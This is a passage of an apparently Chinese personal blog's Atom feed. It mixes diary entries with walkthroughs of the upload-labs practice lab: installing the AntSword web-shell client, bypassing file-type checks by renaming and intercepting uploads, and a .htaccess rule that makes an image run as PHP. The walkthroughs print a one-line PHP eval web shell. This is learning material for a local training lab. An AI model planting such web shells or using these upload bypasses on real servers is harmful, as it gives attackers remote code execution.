    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;稍微改改就好，就像化了个妆人就认不出了。&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_4</title>
    <link href="http://example.com/2022/11/24/upload-labs_4/"/>
    <id>http://example.com/2022/11/24/upload-labs_4/</id>
    <published>2022-11-23T16:00:00.000Z</published>
    <updated>2022-11-24T11:37:43.338Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>改变能够改变的，选择能够选择的。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>测试<br>通过查看源码，我们可以发现，后缀名绕过已经行不通，因此我们需要更换思路。<br>可以尝试用.htaccess绕过。这里涉及到了.htaccess的知识。<br>‘.htaccess’文件相当于一种部分配置文件，好比局部变量一样，只在当前目录生效。比如你设置解析’.txt’解析为’.php’，那么’.htaccess’文件在的子目录中就会执行，而上一级目录不执行。<br>因此可以把目标文件后缀名改为.png，改Apache配置文件httpd.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line"></span><br><span class="line">LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><p>在该目录下创建.htaccess文件，然后写入如下代码，使得解析时将.jpg解析为.php格式。</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;b.jpg&quot;</span>&gt;                      <span class="comment">//如果匹配到名为 b.jpg 的文件 就执行该文件</span></span><br><span class="line">       SetHandler  application/x-httpd-php             <span class="comment">//把文件当成php的代码来解析</span></span><br><span class="line">&lt;/FilesMatch&gt;       </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>上传并尝试执行<br>上传成功，之后蚁剑连接失败。<br>是phpstudy集成环境中 php 的问题<br>因为在小皮面板中php版本是nts意思是即非线程安全，不提供数据访问保护，不支持使用 .htaccess</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;改变能够改变的，选择能够选择的。&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>出淤泥</title>
    <link href="http://example.com/2022/11/23/Diary_1123/"/>
    <id>http://example.com/2022/11/23/Diary_1123/</id>
    <published>2022-11-22T16:00:00.000Z</published>
    <updated>2022-11-24T03:42:50.332Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/kaneki_3.png" alt="金木研"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>World Cup(世界杯)很火，以前都没怎么关注，但是在大学因为各方面因素吧，让我这种从不关注世界杯的人都开始了。当然是被迫的，实在太吵了周围人，让我不得不。<br>然而，虽然很火，其实重头还是在赌球上，并不在足球本身，想想也挺无聊。</p><h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>既见君子，云胡不喜</p><h1 id="欲望的故事"><a href="#欲望的故事" class="headerlink" title="欲望的故事"></a>欲望的故事</h1><p>王阳明上学的路上要经过一条街，一天，街上忽然多了一家赌博的小馆子，里面每天都挤满了人。跟王阳明一起上学的同伴们有时也会好奇地站在门口往里面看。王守仁提醒大家离赌场远点，大家都不当回事：就看看，不进去，有啥？<br>看看劝阻无效，王阳明就跟小伙伴儿建议：咱们换条路走吧。小伙伴儿很不解：“他赌他的，咱走咱的，互不相干，有啥关系？你这胆子也太小了。”<br>王阳明答：“我怕看多了，也会产生欲望，挡不住诱惑。”<br>小伙伴们哈哈大笑：“看几眼就受不了，那意志也太不坚定了。咱们这么志怀高远的不会的，放心好了。”<br>小伙伴们坚持走原路，只有王阳明一个人每天绕道去私塾，不再从那条街过。<br>一个多月后，有位同学接连几天都没来上课。原来他前段时间迷上了赌博，开始只是拿一点小钱来玩，后来越玩越大，偷了家里的玉器，父母得知后非常生气，把他关在家中反省。<br>王守仁后来讲这个故事给人听，并总结说：“想要避免欲望，最好的办法就是远离，甚至不要多看一眼。这不是胆子小，而是从根源上隔绝欲望。”</p><h1 id="我的看法"><a href="#我的看法" class="headerlink" title="我的看法"></a>我的看法</h1><p>很多年前看到这个故事，是在一本杂志的卷首。说实话，这给了我非常大的触动。在这之前，我一直认为，抵挡不住诱惑是因为自身的意志力不够，所以才会被欲望牵着鼻子走。可看了这样一个如此优秀的人都没有对自己自制力感到自信，我也释然了。<br>像这样有智慧的人，即便是在他小时候，已经能明悟这种很多人不明白的道理，也远超大多成年人了。</p><h1 id="世界杯"><a href="#世界杯" class="headerlink" title="世界杯"></a>世界杯</h1><p>如果世界杯的火爆只是因为赌球，那只能是一种悲哀。因为赌球无非是贪欲和浮躁的混杂，既无技术又无规律，毫无看点可言。<br>虽然我对世界杯没有兴趣，却也不愿看到这种光景。<br>然而，其实我们也可以反思当下环境中赌球之心如此热烈的原因。主要原因就是经济衰退，赚钱困难。也可谓人之常情吧。<br>最近周围很多人都在谈论赌球，甚至参与赌球。但我绝不参与，无论周围人之后翻了多少倍我也不会眼红。原因，已经在上面故事里讲得很清楚了。只是即便如此也会被影响，还是略有不适吧。<br>好笑的是，原本周围两个冷战关系不好的人，却因为世界杯赌球聊起来了。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我现在就像是在淤泥中，愿我能不染。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/kaneki_3.png&quot; alt=&quot;金木研&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs以及蚁剑安装</title>
    <link href="http://example.com/2022/11/23/upload-labs+%E8%9A%81%E5%89%91install/"/>
    <id>http://example.com/2022/11/23/upload-labs+%E8%9A%81%E5%89%91install/</id>
    <published>2022-11-22T16:00:00.000Z</published>
    <updated>2022-11-23T13:38:14.495Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>安装这个两个东西，其实还是有点麻烦的，于我而言。所以我打算记录一下。</p><span id="more"></span><h1 id="蚁剑安装"><a href="#蚁剑安装" class="headerlink" title="蚁剑安装"></a><strong>蚁剑安装</strong></h1><p>首先我们要获取蚁剑–&gt;<a href="https://www.yuque.com/antswordproject/antsword/srruro">获取蚁剑</a><br>点击里面的链接“获取加速器”<br>先自己建立一个AntSword目录并在该目录里建立antsword_project目录，然后下载自己所需的版本，解压。<br>之后再点击解压后的AntSword.exe文件，记得用<strong>管理员方式</strong>打开，初始化，选择antsword_project空目录作为蚁剑的工作目录。<br>如果之前已经有了蚁剑源代码，可以在这一步选择工作目录的时候，直接选择该目录作为工作目录。</p><h1 id="upload-labs配置"><a href="#upload-labs配置" class="headerlink" title="upload-labs配置"></a>upload-labs配置</h1><p>官方地址：<a href="https://github.com/c0ny1/upload-labs">upload-labs</a><br>按照提示进行即可。<br>推荐的PHP5.2.117，PHP官方已经没有下载地址了，所以我们可以另找一个。<br><a href="https://www.cnblogs.com/endv/p/7743472.html">PHP5.2.17下载链接</a><br>选择其中的php-5.2.17-nts-Win32.zip下载即可。<br>解压后，把php.ini-recommended改成php.ini<br>然后把解压后的所有文件放在phpstudy的PHP目录下(默认安装了phpstudy)，这样就完成了。<br>如果Windows，点击下载地址链接，选择其中的Source code下载即可（有phpstudy的话）。<br>将其转移到phpstudy下的WWW目录，把upload-labs-masters目录名改为upload-labs。<br>并在其下建立一个upload，作为其存放上传文件的目录。<br>网站测试：<br>启动phpstudy，网页输入：127.0.0.1&#x2F;upload-labs<br>如果成功显示正常页面就基本没问题了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;安装这个两个东西，其实还是有点麻烦的，于我而言。所以我打算记录一下。&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    <category term="蚁剑" scheme="http://example.com/categories/upload-labs/%E8%9A%81%E5%89%91/"/>
    
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="安装" scheme="http://example.com/tags/%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_1</title>
    <link href="http://example.com/2022/11/23/upload-labs_1/"/>
    <id>http://example.com/2022/11/23/upload-labs_1/</id>
    <published>2022-11-22T16:00:00.000Z</published>
    <updated>2022-11-27T06:24:03.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>作为上传漏洞的第一关，啥都没了解就开始做还是遇到了一些障碍。</p><span id="more"></span><h1 id="upload的大致思路图"><a href="#upload的大致思路图" class="headerlink" title="upload的大致思路图"></a>upload的大致思路图</h1><p><img src="/simg/upload-labs_1.png" alt=" "></p><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><ol><li><p>测试<br>看到任务，是上传一个webshell到服务器。<br>首先尝试上传，选择png文件，上传成功<br>然后选择txt文件，出现报错，显示只能上传jpg,png,gif的文件。<br>于是我们可以先把想要上传的文件改为允许类型，再抓包改文件后缀，实现shell的上传。</p></li><li><p>尝试与抓包<br>把写有 <code>&lt;?php phpinfo(); ?&gt;</code> 代码的txt文件改文件名为a.png。<br>提交后burp抓包，得到包的内容后，把包里的所有png改为php，之后放包，我们就可以看到文件上传成功了。<br>再打开网址测试 <code>127.0.0.1/upload-labs/upload/a.php</code><br>页面显示成功，那么说明我们的思路没问题。</p></li><li><p>上传webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); @eval($_POST[&#x27;shell&#x27;]); ?&gt;   写入到b.txt</span><br><span class="line">将文件后缀改为png</span><br></pre></td></tr></table></figure><p>和上一个步骤一样，上传文件。<br>然后测试 <code>127.0.0.1/upload-labs/upload/b.php</code><br>显示成功。<br>我们可以打开蚁剑。点击鼠标右键-&gt;添加数据<br>“URL地址”填写测试的地址，连接密码自己任意设定。如果不放心，点右上角的“测试连接”，成功代表无问题，最后左上角“添加”。<br>创建成功后，右键点击我们创建的这条数据，再点“虚拟终端”，输入dir可看到目录中存在我们的php文件。</p></li></ol><h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><p>由于白名单函数是在JavaScript中运行，所以可以禁用或修改JavaScript来关闭白名单，这样就可以直接把目标文件上传到服务器。<br>比如在Firefox中打开about:config，然后搜索javascript.enabled  默认是true，即使用JavaScript。可以修改为false禁用。<br>或者按F12，修改白名单的源码保存。（不推荐，实际用处不大）</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>曲曲折折走了些弯路，幸好最后成功了，不过先看点教学视频也许会上手更快。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Xionghuimin/article/details/106506988#:~:text=%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%89%93%E5%BC%80%20%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91%20%EF%BC%8C%E5%A2%9E%E5%8A%A0%20%E6%95%B0%E6%8D%AE%20%EF%BC%8C%E7%84%B6%E5%90%8E%E5%A1%AB%E5%86%99URL%20%E5%9C%B0%E5%9D%80%20%EF%BC%8C%E5%A1%AB%E5%86%99%E8%87%AA%E5%B7%B1%E7%9A%84%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,%E5%80%BC%20%E4%B8%BA%E7%A9%BA%20%EF%BC%8C%E4%B8%8D%E8%A6%81%E7%9D%80%E6%80%A5%EF%BC%8C%E5%8F%AA%E8%A6%81%E4%BD%A0%E5%A6%82%E4%B8%8B%E5%A1%AB%E5%86%99%E5%B0%B1%E8%A1%8C%E3%80%82%20%E5%89%8D%E9%9D%A2%E6%98%AF%E8%87%AA%E5%B7%B1%E7%9A%84IP%20%E5%9C%B0%E5%9D%80%20%EF%BC%8C%E5%90%8E%E9%9D%A2%E6%98%AF%E8%87%AA%E5%B7%B1%20%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%20%E7%9A%84%E4%BD%8D%E7%BD%AE%E3%80%82">文件上传漏洞—蚁剑连接地址错误、一句话木马php语法错误</a><br><a href="https://blog.csdn.net/hexiaan/article/details/127054253">upload-labs Pass-01</a><br><a href="https://blog.csdn.net/wo41ge/article/details/107313203">upload-labs 21关大合集</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;作为上传漏洞的第一关，啥都没了解就开始做还是遇到了一些障碍。&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>我对普通人类没有兴趣</title>
    <link href="http://example.com/2022/11/21/Diary_1121/"/>
    <id>http://example.com/2022/11/21/Diary_1121/</id>
    <published>2022-11-20T16:00:00.000Z</published>
    <updated>2022-11-21T16:50:00.756Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B4.png" alt="志摩凛"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>晚上学习的时候一个东西始终搞不通，烦死人了。</p><h1 id="一段文言文"><a href="#一段文言文" class="headerlink" title="一段文言文"></a>一段文言文</h1><p>夫子之道至大，故天下莫能容。虽然，夫子推而行之，不容何病，不容然后见君子！夫道之不修也，是吾丑也。夫道既已大修而不用，是有国者之丑也。不容何病，不容然后见君子！<br>--节选自《史记 孔子世家》</p><h1 id="不容然后见君子"><a href="#不容然后见君子" class="headerlink" title="不容然后见君子"></a>不容然后见君子</h1><p>上面那段文言文，最喜欢的就是我写在标题上这句话。有一种豪气或是傲慢在里面：你天下容不下我的理念，这是你天下的度量不够大，这不是我的过错。容不下又如何呢？就是因为容不下，才显得我是君子！<br>这是孔子提问时，颜回对孔子的回答。不愧是孔子最得意的门生呀。我想，做人能做到这种程度，就已然足够了。</p><h1 id="永恒"><a href="#永恒" class="headerlink" title="永恒"></a>永恒</h1><p>在最光辉灿烂的时候把生命一下子玩到尽头，就是永恒！  --黄家驹<br>来吧，用尽力气，去燃烧生命吧！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E5%BF%97%E6%91%A9%E5%87%9B4.png&quot; alt=&quot;志摩凛&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
</feed>
